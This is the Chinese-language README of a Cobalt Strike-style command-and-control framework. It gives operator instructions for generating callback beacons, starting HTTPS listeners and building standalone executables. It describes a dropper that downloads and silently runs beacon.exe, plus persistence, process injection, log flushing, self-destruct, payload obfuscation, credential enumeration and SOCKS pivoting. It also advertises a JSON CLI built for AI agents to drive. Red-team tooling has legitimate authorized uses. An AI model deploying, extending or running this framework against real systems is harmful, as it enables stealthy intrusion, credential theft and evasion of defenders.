# cscli — 类 Cobalt Strike 的 C2 框架（CLI）

一个轻量级、**纯 Python 标准库**实现的命令与控制（C2）框架，参照 Cobalt Strike
的 beacon / team server 模型。它是一套自包含工具，仅用于**授权的安全测试、红队
演练与教学**。你只能将其用于自己拥有或获得明确书面授权的系统。

> 中英文档：`README.md`（English）  /  `README.zh-CN.md`（简体中文）

## 架构

```
┌───────────────────────────────┐        HTTP/JSON        ┌──────────────────────────┐
│   cscli 操作端控制台           │                          │   cscli beacon（植入端）  │
│   （交互式 CLI）              │                          │                          │
│  ├─ TeamServer（编排器）      │◄────── checkin/任务 ────►│  轮询 /checkin           │
│  │   ├─ 监听器（HTTP/HTTPS）  │  结果 ────────────────►│  执行任务                │
│  │   └─ 会话存储（持久化）    │                          │  回传 base64 结果        │
└───────────────────────────────┘                          └──────────────────────────┘
```

- **服务端**（`cs/server/`）：`TeamServer` 持有 `Listeners`（HTTP/HTTPS beacon
  端点）与持久化 `SessionStore`。控制台直接对接它。
- **客户端**（`cs/client/beacon.py`）：自包含 beacon，轮询监听器、拉取排队任务、
  在目标上执行、回传结果。
- **Payload 生成器**（`cs/payload/`）：生成单文件、独立 beacon `.py`（命令目录与
  模块已内联），脱离包也能运行。
- **加密**（`cs/crypto/`）：纯 Python AES-GCM 通道加密 + 为 HTTPS 监听器自动生成
  自签 TLS 证书。
- **能力模块**（`cs/modules/`）：持久化、进程注入、反取证、混淆、利用阶段辅助、
  SOCKS5 内网穿透、门控的系统原生凭据数据接口。
- **编译二进制**（`scripts/build-binary.sh`）：用 PyInstaller 把 beacon 打成独立
  可执行文件（64/32 位）。注意 PyInstaller 不支持交叉编译：请在目标同架构上运行
  该脚本。PE 投递链（`cs/modules/dropper.py`）生成用于 Windows 拉取并运行的
  `.ps1`/`.bat` 加载器。

## HTTPS 监听 + AES-GCM 通道加密

两层传输加固：

1. **HTTPS**：`https <name> <port> [host]` 启动 TLS 监听，首次自动生成自签 RSA
   证书。beacon 用 `write_payload(..., no_verify=True)`（或 `--no-verify`）连接。

2. **AES-GCM 报文加密**：控制台用 `key <passphrase>` 设置口令后，之后启动的所有
   监听器都会用 AES-GCM 加密 JSON 协议报文。用相同口令生成匹配 beacon：
   `write_payload(url, ..., key=KEY)`。篡改或错误口令会被服务端 GCM 标签校验拒绝。

线上格式（信封）：`nonce(12) || 密文 || tag(16)`，AES-256-GCM，密钥由口令经
PBKDF2-HMAC-SHA256 派生。

```bash
# 控制台
cscli> key MyS3cret-Passphrase          # 让新监听器启用 AES
cscli> https tls 443 0.0.0.0            # HTTPS + AES 监听器
# 生成 beacon（相同口令，自签证书用 no-verify）
python3 -c "from cs.payload import write_payload;
write_payload('https://YOUR_SERVER:443','b.py', key='MyS3cret-Passphrase', no_verify=True)"
python3 b.py
```

## 能力模块（beacon 命令集）

以下命令可作为任务下派给 beacon（也可在交互式 `use <id>` 提示符下直接输入）：

| 命令 | 说明 |
|---|---|
| `persist <mech> <path> [name]` | 安装持久化。机制：`cron`、`shell-profile`、`xdg-autostart`、`systemd`（Linux）；`registry`/`win-runkey`（Windows）。`persist list` 枚举。 |
| `inject <tech> <pid> <ref>` | 进程注入。`win-dll <pid> <dll路径>` 与 `win-shellcode <pid> <b64>`（远线程注入，仅 Windows）；`linux-ldpreload`（参考）。非目标平台明确拒绝。 |
| `wipe <path> [rounds]` | 反取证：先用 0 覆写文件再删除。 |
| `flushlogs` | 尽力清空系统日志（Linux journal/messages/auth；Windows 事件日志）。 |
| `cleanmru <path>` | 从系统最近使用/MRU 列表移除路径。 |
| `selfdestruct <path>` | 覆写删除本 beacon 文件与临时副本后退出。 |
| `socks <port>` / `socks-stop` | 在 beacon 上启动/停止 SOCKS5 内网穿透代理。 |
| `creds [env|windows|linux|all]` | 枚举操作系统向**当前用户**暴露的凭据（见下“门控凭据接口”）。 |

## 编译二进制 + PE 投递

PyInstaller 把 beacon 打成独立可执行文件（目标无需安装 Python）。PyInstaller
**不能**交叉编译：
- 在本 Linux 主机：`./scripts/build-binary.sh linux64` → `dist/cscli-beacon`
  （当前架构的原生 ELF）。
- 若要 Windows `.exe`（64/32 位）：在装有 Python 3.8+ 的 Windows 主机上运行同一
  脚本，得到原生 `.exe`。这正是下面 PE 投递链要拉取并执行的产物。

运行编译后的 beacon 与脚本版一致：
```bash
./cscli-beacon https://SERVER:443 --name <id> --key <Key> --no-verify
```

PE 投递链（`cs/modules/dropper.py`）生成下载编译 `.exe` 并以隐藏窗口运行的
`.ps1`/`.bat` 加载器——典型的 Windows 一阶段。把 `.exe` 放在监听器 `beacon.exe`
路径并部署加载器：
```python
from cs.modules.dropper import write_pe_loader
write_pe_loader("https://SERVER:443/beacon.exe", "loader.ps1")
```

## SOCKS5 内网穿透（经 C2 访问内网）

在 beacon 上执行 `socks <port>`（如 `socks 1080`），即启动本地 SOCKS5 代理。
把你的工具 / proxychains / 浏览器指向该 beacon 地址，beacon 会把每个连接经 C2
监听器回传，由服务端代为连接目标内网主机并双向转发——这是绕过操作端无法直连
内网的经典穿透手法。

```bash
cscli> use <session>
beacon[<session>]> socks 1080
# 操作端：proxychains curl --socks5 <beacon_ip>:1080 http://10.x.x.x/
```
在 `p.conf` 中写 `socks5 <beacon_ip> 1080`，然后
`proxychains4 -q -f p.conf <tool>`。

## 门控的 OS 原生凭据接口

beacon 命令 `creds [env|windows|linux|all]` 只报告操作系统通过**文档化 API**
向**调用用户**暴露的凭据：Windows 凭据管理器（`cmdkey`）、用户环境变量、（Linux）
会话内核密钥环。它**不是** Mimikatz 转储——不会抓取 LSASS 内存、也不恢复账号口令，
并且不会对非操作端自己的测试主机以外的账号起作用。仅用于你有权测试的系统。

## 混淆与利用阶段辅助

`cs/modules/obfuscation.py`：
- `obfuscate_payload(src)` — 自解包 zlib+XOR+base64 payload 包装。
- `polyglot_loader(url)` / `string_mask` 等。

`cs/modules/exploitation.py`：
- `make_stager(url)` / `build_beacon_drop(stager, path)` — 用混淆的一阶段 stager
  分阶段投递完整 beacon。
- `encode_pe_stager(path)` — 把编译二进制包成分阶段投递。
- `protocol_replay(...)` — 不触碰系统即验证 C2 协议 tasking。

## 协议

beacon 通过 HTTP POST 与监听器交互（JSON；启用 AES 时为加密信封）：

```
Beacon -> Server   /checkin { beacon_id, meta{...}, results:[{id,data}...] }
Server -> Beacon   { session_id, interval, tasks:[{id,cmd}...], commands:[...],
                     socks_out:[{conn_id,data}...] }
```

一次 checkin 既交付已完成任务的结果，也拉取待执行任务。任务状态
`queued -> sent -> completed`。SOCKS 穿透用 `/socks_open`、`/socks`、
`/socks_close` 端点，把 beacon 内网流量与 C2 控制面分离。

## Beacon 端命令（基础）

`help` 列出全部。完整集合：`shell`、`cd`、`pwd`、`ls`、`cat`、`download`、
`upload <path>;<b64>`、`info`、`whoami`、`sysinfo`、`sleep <sec>`、
`exec <python>`、`persist`、`inject`、`wipe`、`flushlogs`、`cleanmru`、
`selfdestruct`、`socks`、`socks-stop`、`creds`、`exit`。

## 快速开始

```bash
# 1. 启动团队服务器控制台
python3 cscli

# 2. 控制台内启动监听器
cscli> listener main 8080 0.0.0.0

# 3. 生成目标用的 beacon payload（另一个终端）
python3 -c "from cs.payload import write_payload;
write_payload('http://YOUR_SERVER:8080', 'beacon.py', interval=3)"

# 4. 在授权目标上部署并运行：
python3 beacon.py

# 5. 回到控制台查看会话并下派任务
cscli> sessions
cscli> use <session_id>
beacon[<session_id>]> shell id
beacon[<session_id>]> pwd
beacon[<session_id>]> exit
cscli> results <session_id>
```

## 控制台命令

| 命令 | 说明 |
|---|---|
| `listener <name> <port> [host]` | 启动 HTTP 监听器 |
| `https <name> <port> [host]` | 启动 HTTPS 监听器（自动自签证书） |
| `listener-stop <name>` | 停止监听器 |
| `listeners` | 列出运行中的监听器 |
| `key <passphrase>` / `keys` | 设置 / 查看 AES 通道加密 |
| `sessions` | 列出活跃 beacon（超时未回连标记 STALE） |
| `use <id>` / `interactive` | 进入交互模式向 beacon 下派任务 |
| `results <id>` | 查看某会话收集到的结果 |
| `clear-results <id>` | 清空某会话的结果 |
| `sleep <sec>` | 默认 beacon 回连间隔 |
| `help` / `quit` | 帮助 / 退出 |

## 非交互式 CLI（AI / 脚本驱动）

`cscli` 也可作为单发式、JSON 输出的驱动，供 Agent 或 CI 流水线使用——交互提示符里
能做的一切都能一条命令驱动。每次调用是独立进程，通过数据目录共享状态
（`CSCLI_DATA_DIR`，默认为 `<repo>/data`）；监听器由分离的后台守护进程持有。

```bash
# 启动监听器（--background 分离守护进程）
cscli --server --https --host 0.0.0.0 --port 443 --name main \
      --key MyS3cret-Passphrase --background
#   -> {"ok":true,"daemon_pid":...,"listener":"https://0.0.0.0:443",...}

# 生成客户端 payload
cscli --payload --url https://h:443 --out beacon.py --key MyS3cret-Passphrase --no-verify

# 列会话 / 下派任务并等待 / 导出结果（全部 JSON 输出）
cscli --list
cscli --task <session_id> "shell id" --wait --timeout 40
cscli --results <session_id>
```

也可用 Python API 实现同样效果：
```python
from cs.server import TeamServer
from cs.payload import write_payload
srv = TeamServer(data_dir="data")
lis, err = srv.start_https_listener("main","0.0.0.0",443, crypto_key=KEY)
write_payload(f"https://h:443","beacon.py", key=KEY, no_verify=True)
# ...
srv.task(session_id, "shell id")
```

## 持久化

会话、任务与结果状态以 JSON 持久化在 `data/sessions.json`（可用 `CSCLI_DATA_DIR`
环境变量指定目录）。重启控制台即恢复历史会话。

## 测试

仓库自带 6 个自测（全部本地回环，无跨主机 C2 流量）：

```bash
python3 test_e2e.py      # API 级：存储 + 监听器 + 进程内往返
python3 test_live.py     # 真实 beacon 子进程 + 驱动 tasking
python3 test_operator.py # 完整操作端控制台驱动真实 beacon 端到端
python3 test_tls.py      # HTTPS + AES-GCM 加密通道 + 模块 tasking
python3 test_socks.py    # SOCKS5 穿透隧道到内网
python3 test_compiled.py # PyInstaller 编译二进制端到端
python3 test_cli_driver.py # 非交互式 CLI 驱动（server/payload/list/task/wait）
```

## 目录结构

```
cs/
  __init__.py
  commands.py            # 共享命令目录 + 校验
  crypto/                # 纯 Python AES + GCM；TLS 证书生成
    aes.py  __init__.py  certs.py
  server/                # TeamServer、HTTP(S) 监听器、会话存储、SOCKS relay
  client/beacon.py       # 自包含 beacon / 植入端
  payload/               # 独立 payload 生成（内联全部依赖）
  modules/               # persistence、injection、antiforensics、obfuscation、
                         #   socks（SOCKS5 穿透）、credentials、dropper（PE 链）、
                         #   exploitation
  cli/console.py         # 交互式操作端 CLI
build/beacon_entry.py    # PyInstaller 入口
scripts/build-binary.sh  # 编译独立 beacon 可执行文件
test_*.py                # 自测（见“测试”）
```

## 免责声明

本软件仅用于授权的安全测试与教学。未经许可对任何系统使用均属违法行为。请
勿在未授权系统上运行植入端。
